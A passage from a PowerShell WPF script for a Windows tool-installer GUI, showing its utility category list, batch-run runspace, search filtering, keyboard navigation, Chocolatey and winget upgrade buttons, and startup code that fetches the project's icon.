        @{ Name = "LocalSend"; Func = { Install-LocalSend } },
        @{ Name = "Notepad++"; Func = { Install-NotepadPP } },
        @{ Name = "ShareX"; Func = { Install-ShareX } },
        @{ Name = "qBittorrent"; Func = { Install-QBit } }
    )

    # Column 4
    Update-InitProgress -Percent 94 -Status "Building Category (5/5): Win Tools & Utilities..."
    Add-Category -ColIndex 4 -Title "Win Tools" -Items @(
        @{ Name = "TestDisk"; Func = { Install-TestDisk } },
        @{ Name = "FreeRecover"; Func = { Install-FreeRecover } },
        @{ Name = "Kickass Undelete"; Func = { Install-KickassUndelete } },
        @{ Name = "CPU-Z"; Func = { Install-CPUZ } },
        @{ Name = "HWiNFO"; Func = { Install-HWiNFO } },
        @{ Name = "GPU-Z"; Func = { Install-GPUZ } },
        @{ Name = "CrystalDiskInfo"; Func = { Install-CrystalDiskInfo } },
        @{ Name = "CrystalDiskMark"; Func = { Install-CrystalDiskMark } },
        @{ Name = "DriverStore Explorer"; Func = { Install-DriverStoreExplorer } },
        @{ Name = "Ventoy"; Func = { Install-Ventoy } },
        @{ Name = "Rufus"; Func = { Install-Rufus } },
        @{ Name = "AnyBurn"; Func = { Install-AnyBurn } },
        @{ Name = "Git Cloner"; Func = { Run-GitCloner } },
        @{ Name = "Downly"; Func = { Install-Downly } },
        @{ Name = "Monkeytype tui"; Func = { Run-MonkeytypeTui } }
    )

    # ============================================================
    #  SECTION G: RUN SELECTED (non-blocking via Runspace)
    # ============================================================

    $script:BtnRun.Add_Click({
        # Gather checked items
        $selected = @($script:AllTasks | Where-Object { $_.CheckBox.IsChecked })

        if (-not $selected -or $selected.Count -eq 0) {
            [System.Windows.MessageBox]::Show(
                "No items are checked.`nPlease check at least one item before clicking Run Selected.",
                "Nothing Selected",
                [System.Windows.MessageBoxButton]::OK,
                [System.Windows.MessageBoxImage]::Information
            ) | Out-Null
            return
        }

        $script:BtnRun.IsEnabled = $false
        $script:BtnRun.Content = "Running..."
        $script:ProgressBar.Value = 0
        $script:ProgressBar.Maximum = $selected.Count

        Write-Log ("=== Batch run started: {0} item(s) ===" -f $selected.Count) -Level Info

        # Share references into runspace
        $rsData = @{
            SelectedTasks = $selected
            ProgressBar   = $script:ProgressBar
            StatusLabel   = $script:LblStatus
            RunButton     = $script:BtnRun
            CLR_TEXT      = $brushText
            CLR_YELLOW    = $brushYellow
            CLR_GREEN     = $brushGreen
            CLR_RED       = $brushRed
        }

        $rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
        $rs.ApartmentState = "STA"
        $rs.ThreadOptions = "ReuseThread"
        $rs.Open()
        foreach ($k in $rsData.Keys) { $rs.SessionStateProxy.SetVariable($k, $rsData[$k]) }

        $ps = [System.Management.Automation.PowerShell]::Create()
        $ps.Runspace = $rs

        [void]$ps.AddScript({
            function Ui-Log {
                param([string]$Msg, $Clr)
                $ts = (Get-Date).ToString("HH:mm:ss")
                $StatusLabel.Dispatcher.Invoke([System.Action] {
                    $StatusLabel.Foreground = $Clr
                    $StatusLabel.Text = "[$ts] $Msg"
                })
            }

            $total = $SelectedTasks.Count
            $ok = 0
            $fail = 0

            for ($i = 0; $i -lt $total; $i++) {
                $task = $SelectedTasks[$i]
                $idx = $i
                $tName = $task.Name
                $StatusLabel.Dispatcher.Invoke([System.Action] {
                    $StatusLabel.Text = "Task $($idx+1) of $total : $tName"
                })

                Ui-Log -Msg "Running: $($task.Name) ..." -Clr $CLR_YELLOW

                if ($null -eq $task -or $null -eq $task.Function) {
                    Ui-Log -Msg "FAILED:  $($task.Name) | Invalid action object." -Clr $CLR_RED
                    $fail++
                    continue
                }
                if ($task.Function -isnot [scriptblock] -and $task.Function -isnot [System.Management.Automation.ScriptBlock]) {
                    Ui-Log -Msg "FAILED:  $($task.Name) | Action is not executable." -Clr $CLR_RED
                    $fail++
                    continue
                }
                if ($task.Name -match "(?i)Portfolio") {
                    Ui-Log -Msg "Skipped: $($task.Name) (Not an installer)" -Clr $CLR_YELLOW
                    continue
                }

                try {
                    & $task.Function
                    Ui-Log -Msg "Done:    $($task.Name)" -Clr $CLR_GREEN
                    $ok++
                }
                catch {
                    Ui-Log -Msg "FAILED:  $($task.Name) | $($_.Exception.Message)" -Clr $CLR_RED
                    $fail++
                }

                $pVal = $i + 1
                $ProgressBar.Dispatcher.Invoke([System.Action] {
                    $ProgressBar.Value = [Math]::Min($pVal, $ProgressBar.Maximum)
                })

                Start-Sleep -Milliseconds 250
            }

            $sumMsg = "=== Completed: $ok Successful  |  $fail Failed ==="
            $sumClr = if ($fail -gt 0) { $CLR_RED } else { $CLR_GREEN }
            Ui-Log -Msg $sumMsg -Clr $sumClr

            $RunButton.Dispatcher.Invoke([System.Action] {
                $RunButton.IsEnabled = $true
                $RunButton.Content = "Run selected"
            })
            $StatusLabel.Dispatcher.Invoke([System.Action] {
                $StatusLabel.Text = "Done   OK: $ok   Failed: $fail"
            })

            $RunButton.Dispatcher.Invoke([System.Action] {
                $icon = if ($fail -gt 0) {
                    [System.Windows.MessageBoxImage]::Warning
                }
                else {
                    [System.Windows.MessageBoxImage]::Information
                }
                [System.Windows.MessageBox]::Show(
                    "Batch run complete.`n`nSuccessful : $ok`nFailed     : $fail",
                    "Run Summary",
                    [System.Windows.MessageBoxButton]::OK,
                    $icon
                ) | Out-Null
            })
        })

        [void]$ps.BeginInvoke()
    })

    # ============================================================
    #  SECTION H: EVENT WIREUPS
    # ============================================================

    # Select All / Unselect All
    $script:chkSelectAll.Add_Checked({
        foreach ($t in $script:AllTasks) {
            $t.CheckBox.IsChecked = $true
        }
    })
    $script:chkSelectAll.Add_Unchecked({
        foreach ($t in $script:AllTasks) {
            $t.CheckBox.IsChecked = $false
        }
    })

    # GitHub Button
    $script:btnGithub.Add_Click({ Open-Github })

    # Bottom Panel Buttons
    $script:btnUpgradeAll.Add_Click({ Start-Process cmd -WindowStyle Minimized -ArgumentList "/k", "choco upgrade all -y --no-desktop-shortcut && echo. && echo Press any key to exit . . . && pause >nul && exit" })
    $script:btnWingetUpgradeAll.Add_Click({ Start-Process winget -WindowStyle Minimized -ArgumentList "upgrade", "--all", "--silent", "--accept-source-agreements", "--accept-package-agreements" })

    # Search Functionality
    $script:txtSearch.Add_GotFocus({
        if ($script:txtSearch.Text -eq "Search...") {
            $script:SkipSearchUpdate = $true
            $script:txtSearch.Text = ""
            $script:txtSearch.Foreground = [System.Windows.Media.Brushes]::White
            $script:SkipSearchUpdate = $false
        }
    })

    $script:txtSearch.Add_LostFocus({
        if ([string]::IsNullOrWhiteSpace($script:txtSearch.Text)) {
            $script:SkipSearchUpdate = $true
            $script:txtSearch.Text = "Search..."
            $script:txtSearch.Foreground = $brushMuted
            $script:SkipSearchUpdate = $false
        }
    })

    $script:txtSearch.Add_TextChanged({
        if ($script:SkipSearchUpdate) { return }
        $query = $script:txtSearch.Text.Trim()
        $isQueryEmpty = ($query -eq "") -or ($query -eq "Search...")

        # Set each row's visibility
        foreach ($t in $script:AllTasks) {
            $innerPanel = $t.RowGrid.Parent
            $gb = $innerPanel.Parent
            
            if ($isQueryEmpty) {
                $match = $true
            } else {
                $match = ($t.Name -match "(?i)" + [regex]::Escape($query)) -or ($gb.Header -match "(?i)" + [regex]::Escape($query))
                if (-not $match -and $null -ne $t.Function) {
                    $funcText = $t.Function.ToString()
                    $match = $funcText -match "(?i)" + [regex]::Escape($query)
                }
            }
            
            if ($match) {
                $t.RowGrid.Visibility = [System.Windows.Visibility]::Visible
            } else {
                $t.RowGrid.Visibility = [System.Windows.Visibility]::Collapsed
            }
        }
        
        # Hide groupboxes with no visible tasks
        $gbs = @()
        foreach ($t in $script:AllTasks) {
            $innerPanel = $t.RowGrid.Parent
            $gb = $innerPanel.Parent
            if ($gbs -notcontains $gb) {
                $gbs += $gb
            }
        }
        
        foreach ($gb in $gbs) {
            $innerPanel = $gb.Content
            $anyVisible = $false
            foreach ($child in $innerPanel.Children) {
                if ($child.Visibility -eq [System.Windows.Visibility]::Visible) {
                    $anyVisible = $true
                    break
                }
            }
            if ($anyVisible) {
                $gb.Visibility = [System.Windows.Visibility]::Visible
            } else {
                $gb.Visibility = [System.Windows.Visibility]::Collapsed
            }
        }
    })

    $script:txtSearch.Add_KeyDown({
        param($s, $e)
        if ($e.Key -eq [System.Windows.Input.Key]::Enter) {
            $e.Handled = $true
            
            $visibleTasks = @()
            foreach ($t in $script:AllTasks) {
                if ($t.RowGrid.Visibility -eq [System.Windows.Visibility]::Visible) {
                    $visibleTasks += $t
                }
            }
            
            if ($visibleTasks.Count -eq 1) {
                $task = $visibleTasks[0]
                $name = $task.Name
                $f = $task.Function
                Write-Log "Launching: $name ..." -Level Running
                try {
                    & $f
                    Write-Log "$name - launched." -Level Success
                }
                catch {
                    Write-Log "ERROR: $name - $($_.Exception.Message)" -Level Error
                }
            }

            [void]$script:txtSearch.Dispatcher.BeginInvoke([System.Action] {
                $script:txtSearch.Focus() | Out-Null
                $script:txtSearch.SelectAll()
            })
        }
    })

    $script:window.Add_PreviewKeyDown({
        param($s, $e)
        
        $focused = [System.Windows.Input.Keyboard]::FocusedElement
        
        # Enter key executes all selected and unselects
        if ($e.Key -eq [System.Windows.Input.Key]::Enter) {
            if ($focused -ne $script:txtSearch) {
                $e.Handled = $true
                $script:BtnRun.RaiseEvent((New-Object System.Windows.RoutedEventArgs([System.Windows.Controls.Button]::ClickEvent)))
                foreach ($t in $script:AllTasks) {
                    $t.CheckBox.IsChecked = $false
                }
                $script:chkSelectAll.IsChecked = $false
            }
        }
        # Space key toggles selection on the focused button
        elseif ($e.Key -eq [System.Windows.Input.Key]::Space) {
            if ($focused -is [System.Windows.Controls.Button]) {
                $currentTask = $script:AllTasks | Where-Object { $_.Button -eq $focused }
                if ($null -ne $currentTask) {
                    $e.Handled = $true
                    $currentTask.CheckBox.IsChecked = -not $currentTask.CheckBox.IsChecked
                }
            }
        }
        # Down Arrow from search box focuses first visible task button
        elseif ($e.Key -eq [System.Windows.Input.Key]::Down -and $focused -eq $script:txtSearch) {
            $firstTask = $script:AllTasks | Where-Object { $_.RowGrid.Visibility -eq [System.Windows.Visibility]::Visible } | Select-Object -First 1
            if ($null -ne $firstTask) {
                $firstBtn = $firstTask.Button
                if ($null -ne $firstBtn) {
                    $e.Handled = $true
                    $firstBtn.Focus() | Out-Null
                }
            }
        }
        # Arrow key navigation between task buttons
        elseif ($focused -is [System.Windows.Controls.Button]) {
            # Find matching task
            $currentTask = $script:AllTasks | Where-Object { $_.Button -eq $focused }
            if ($null -ne $currentTask) {
                # Get visible tasks
                $visibleTasks = @($script:AllTasks | Where-Object { $_.RowGrid.Visibility -eq [System.Windows.Visibility]::Visible })
                
                if ($e.Key -eq [System.Windows.Input.Key]::Down -or $e.Key -eq [System.Windows.Input.Key]::Up) {
                    # Filter tasks in same column
                    $sameColTasks = @($visibleTasks | Where-Object { $_.ColIndex -eq $currentTask.ColIndex })
                    if ($sameColTasks.Count -gt 0) {
                        $currIdx = $sameColTasks.IndexOf($currentTask)
                        
                        if ($e.Key -eq [System.Windows.Input.Key]::Down) {
                            $nextIdx = ($currIdx + 1) % $sameColTasks.Count
                            $sameColTasks[$nextIdx].Button.Focus() | Out-Null
                            $e.Handled = $true
                        }
                        elseif ($e.Key -eq [System.Windows.Input.Key]::Up) {
                            # If first task in column, move back to search bar
                            if ($currIdx -eq 0) {
                                $script:txtSearch.Focus() | Out-Null
                                $e.Handled = $true
                            } else {
                                $nextIdx = ($currIdx - 1 + $sameColTasks.Count) % $sameColTasks.Count
                                $sameColTasks[$nextIdx].Button.Focus() | Out-Null
                                $e.Handled = $true
                            }
                        }
                    }
                }
                elseif ($e.Key -eq [System.Windows.Input.Key]::Right -or $e.Key -eq [System.Windows.Input.Key]::Left) {
                    $dir = if ($e.Key -eq [System.Windows.Input.Key]::Right) { 1 } else { -1 }
                    $targetCol = $currentTask.ColIndex
                    
                    # Scan columns to find one with visible tasks
                    for ($step = 1; $step -lt 5; $step++) {
                        $targetCol = ($targetCol + $dir + 5) % 5
                        $targetColTasks = @($visibleTasks | Where-Object { $_.ColIndex -eq $targetCol })
                        if ($targetColTasks.Count -gt 0) {
                            $targetTask = $targetColTasks[0]
                            try {
                                $currentPoint = $currentTask.Button.TransformToVisual($script:window).Transform((New-Object System.Windows.Point(0, 0)))
                                $currentY = $currentPoint.Y
                                $closestTask = $null
                                $minDiff = [double]::MaxValue
                                foreach ($t in $targetColTasks) {
                                    $tPoint = $t.Button.TransformToVisual($script:window).Transform((New-Object System.Windows.Point(0, 0)))
                                    $diff = [System.Math]::Abs($tPoint.Y - $currentY)
                                    if ($diff -lt $minDiff) {
                                        $minDiff = $diff
                                        $closestTask = $t
                                    }
                                }
                                if ($null -ne $closestTask) {
                                    $targetTask = $closestTask
                                }
                            } catch {
                                # Fallback to first task if visual transformation fails
                            }
                            
                            $targetTask.Button.Focus() | Out-Null
                            $e.Handled = $true
                            break
                        }
                    }
                }
            }
        }
    })

    # ============================================================
    #  SECTION I: STARTUP MESSAGE AND LAUNCH
    # ============================================================

    $script:window.add_SourceInitialized({
        $script:txtSearch.Focus()
        Write-Log "Tool Installer GUI ready - running as Administrator." -Level Success
        Write-Log "Tip: Check boxes next to items and press [Run Selected] for batch install." -Level Info
        Write-Log "Tip: Click any tool button to launch it immediately without queuing." -Level Info

        try {
            $darkMode = 1
            $osVersion = [Environment]::OSVersion.Version
            if ($osVersion.Major -ge 10) {
                $helper = New-Object System.Windows.Interop.WindowInteropHelper($script:window)
                $hwnd = $helper.Handle
                try { [Native.DWM]::DwmSetWindowAttribute($hwnd, 20, [ref]$darkMode, 4) }
                catch { try { [Native.DWM]::DWMSetWindowAttribute($hwnd, 19, [ref]$darkMode, 4) } catch {} }
            }
        } catch {}
    })


    Update-InitProgress -Percent 98 -Status "Preparing window icon and theme..."

    # Load window Icon dynamically
    $iconPath = "$env:TEMP\Tools-Installer.ico"
    try {
        if (-not (Test-Path $iconPath)) {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/afnan-nex/tools-installer/main/Setup/Tools-Installer.ico" -OutFile $iconPath -UseBasicParsing -TimeoutSec 3 -ErrorAction SilentlyContinue
        }
        if (Test-Path $iconPath) {
            $script:window.Icon = New-Object System.Windows.Media.Imaging.BitmapImage(New-Object System.Uri($iconPath))
        }
    }
    catch {}

    Update-InitProgress -Percent 100 -Status "Ready! Launching application..."
    Start-Sleep -Milliseconds 150
    Write-Progress -Activity "Tool Installer - Starting Up" -Completed
    Write-Host "`n`n  [OK] Initialization complete. Launching GUI...`n" -ForegroundColor Green
    Start-Sleep -Milliseconds 150

    # Hide the calling PowerShell CLI console window on completion
    try {
        $consoleHWnd = [Console.Window]::GetConsoleWindow()
        if ($consoleHWnd -ne [IntPtr]::Zero) {
            [Console.Window]::ShowWindow($consoleHWnd, 0) | Out-Null
        }
    } catch {
        "Console suppression error: $_" | Out-File -FilePath $logPath -Append
    }

    $script:window.ShowDialog() | Out-Null
    exit

} catch {
    $err = $_.Exception.ToString()
    $err | Out-File -FilePath $logPath -Append
    try {
        [System.Windows.MessageBox]::Show("CRITICAL EXCEPTION IN TOOL INSTALLER:`n`n$err", "Tool Installer Error")
    } catch {
        # Fallback to Windows Forms if WPF MessageBox fails
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.MessageBox]::Show("CRITICAL EXCEPTION IN TOOL INSTALLER:`n`n$err", "Tool Installer Error")
    }
    exit 1
}
